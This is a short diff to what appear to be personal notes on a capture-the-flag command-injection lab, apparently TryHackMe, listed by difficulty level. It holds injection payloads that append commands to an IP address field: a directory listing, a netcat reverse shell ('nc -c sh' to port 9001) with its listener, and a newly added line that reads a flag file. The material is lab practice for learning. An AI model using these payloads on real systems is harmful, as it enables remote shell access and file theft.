@@ -7,6 +7,9 @@ LOW DIFF.
 127.0.0.1 | ls
 127.0.0.1 &&nc -c sh 127.0.0.1 9001 --> execute netcat shell on the command injection module 
 start a listener with nc -lnvp 9001 on the attacker
+127.0.0.1 | cat /home/tryhackme/flag.txt
+
+
 
 MEDIUM DIFF.
 127.0.0.1 | ls
